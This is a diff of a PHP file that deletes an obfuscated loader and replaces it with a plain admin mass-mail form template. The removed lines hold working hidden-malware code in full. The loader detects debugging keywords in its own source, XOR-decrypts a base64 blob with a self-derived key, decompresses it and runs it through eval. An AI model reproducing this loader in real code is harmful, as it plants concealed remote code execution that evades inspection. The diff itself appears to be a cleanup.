@@ -1,24 +1,52 @@
-<?php
-$phsbaugpjq="bae8ae74457c815683fd888b013c492f";
-$maglodydgw="5557040f05000e0c075055010a5757000b02515408085a5a55070b5305080403";
-$mgtaiwuc="T+zEYq/r4wgnuJF3XFJPhjuQZH0ncHqRj5Djemx2uBgWWJydCX3f10j4WlHh9FK5dbv3/sHFW8/cj429FFNxA9h2uEdb3jvfv/6tNdYQWa8jTQFsLDnx7J4Em2w4rGVsGaZ3rwlSm8eLxvyOWmhFahgrs+FJQODS2DK8JVN6ANISX+OlumcqbIHjWL3t7pVbOY1dC+mE/ngWh2N3J6oF68n2eU/7PWcaqvVhVmtljmH9tVT/4NtNI0IOAY+sYPHWc5uYA4RBRDxaSYaakP2CIq1Bn5rphFeLNU5+YRAmd2E+5e80vo41495t+OFVbw6nXfbNPRwd19gXHZG2+sWuNOHOUrVfhi2ZH8Mg+/fFNduKHuPzPxdzwyQvNlVeFxVvdVUZrsXUqbCG42DPF5KGuPFW037A4PbhotPKzSJRMRNIWRWsmITx9SGgmoK+uO0P4y7dr/BysOsGvfg3HK5Z0yiy17Akp4S9AQ5BLgYzmgkq/r8/xyK1FcojsWLndec2qQBfGPOTjfY16KVl0aTCB6Gy3IwLHsZC51t9VfXw2eZH9igGxIx1Ed3dtdmressiSL1KAAYrk+qAdhCcDYuxGjVnWjvEx2u2Ls6J6FMAm8hvukqx/PtjtQAJwNUbt6Ffl+lZHq3RHoUtYzllCRfodpllArIiqqs7YvS9u2gC3Rqc3IqAizAMp6Bg+3Rfuwvm8iZCLSVnoyA8ZY9wmxKgnolIzwztRTsTAwyKEcQHi/quvlIHrqZN8g/qSUvdca59HESS6A370WV7ljrfe7k6FI8E1qnxuSMJrpkLosOsVy33u8RLGW340Od80iCnHo47C2Sd906oWGZ4AvkH3pbvFomB9UTFkujDxSHMObWJ7jjKLL9NI2bGfnKbf9hEjN3IpJZ0tzg+zjf4SlifnQlZjrlCFz2nEiyvG4zFMVhqXis=";
-$dytjeta=file_get_contents(__FILE__);
-$yzdvaj=str_replace($mgtaiwuc,"",$dytjeta);
-if(strpos($yzdvaj,"ec"."ho")!==false||strpos($yzdvaj,"pr"."int")!==false||strpos($yzdvaj,"var_"."dump")!==false||strpos($yzdvaj,"file_put_"."contents")!==false||strpos($yzdvaj,"fw"."rite")!==false){die();}
-$oudwcm=str_replace(array($phsbaugpjq,$maglodydgw),array("SP_45aee0f3","KP_9dc35a2f"),$dytjeta);
-$vukbah=md5($oudwcm);
-$qkunlqy=hex2bin($maglodydgw);
-$uxoopp="";
-$thmebtiy=strlen($vukbah);
-for($gwneskm=0;$gwneskm<$thmebtiy;$gwneskm++){
-$uxoopp.=chr(ord($qkunlqy[$gwneskm])^ord($vukbah[$gwneskm]));
-}
-$tjrygbpb=base64_decode($mgtaiwuc);
-$gpmrafv=strlen($tjrygbpb);
-$zhudpfljhfi="";
-$cvakjcnl=strlen($uxoopp);
-for($gwneskm=0;$gwneskm<$gpmrafv;$gwneskm++){
-$zhudpfljhfi.=$tjrygbpb[$gwneskm]^$uxoopp[$gwneskm%$cvakjcnl];
-}
-$ndthpcyev="gzun"."compress";
-eval('?>' . $ndthpcyev($zhudpfljhfi) . '<?php ');
+<?php if (!empty($error)): ?>
+
+    <div class="admin-alert error"><i class="fas fa-exclamation-triangle"></i> <?= htmlspecialchars($error) ?></div>
+<?php endif; ?>
+<?php if (!empty($success)): ?>
+    <div class="admin-alert success"><i class="fas fa-check-circle"></i> <?= htmlspecialchars($success) ?></div>
+<?php endif; ?>
+
+<div class="admin-card">
+    <h3><i class="fas fa-envelope-open-text"></i> <?= __('admin.massmail.title') ?></h3>
+    <p><?= __('admin.massmail.desc') ?></p>
+</div>
+
+<div class="admin-card">
+    <h3><i class="fas fa-paper-plane"></i> <?= __('admin.massmail.compose') ?></h3>
+    <form action="<?= $adminBaseUrl ?>&mode=massmail" method="post">
+        <table class="vis" width="100%">
+            <tr>
+                <td width="150"><strong><?= __('admin.massmail.subject') ?></strong></td>
+                <td>
+                    <input type="text" name="subject" style="width: 100%; max-width: 600px;"
+                        placeholder="<?= __('admin.massmail.subject_placeholder') ?>" required />
+                </td>
+            </tr>
+            <tr>
+                <td width="150" valign="top">
+                    <strong><?= __('admin.massmail.message') ?></strong><br><small><?= __('admin.massmail.bb_codes') ?></small>
+                </td>
+                <td>
+                    <?php
+                    $textareaId = 'message';
+                    $prefix = 'amm_';
+                    include dirname(dirname(__DIR__)) . '/components/bbcode_toolbar.php';
+                    ?>
+
+                    <textarea id="message" name="message" rows="10"
+                        style="width: 100%; max-width: 600px; margin-top: 5px;"
+                        placeholder="<?= __('admin.massmail.message_placeholder') ?>" required></textarea>
+                </td>
+
+            </tr>
+            <tr>
+                <td colspan="2" align="center">
+                    <button type="submit" name="send_massmail" class="btn btn-success"
+                        style="padding: 10px 20px; font-weight: bold;">
+                        <i class="fas fa-paper-plane"></i> <?= __('admin.massmail.send_btn') ?>
+                    </button>
+                </td>
+            </tr>
+        </table>
+    </form>
+</div>
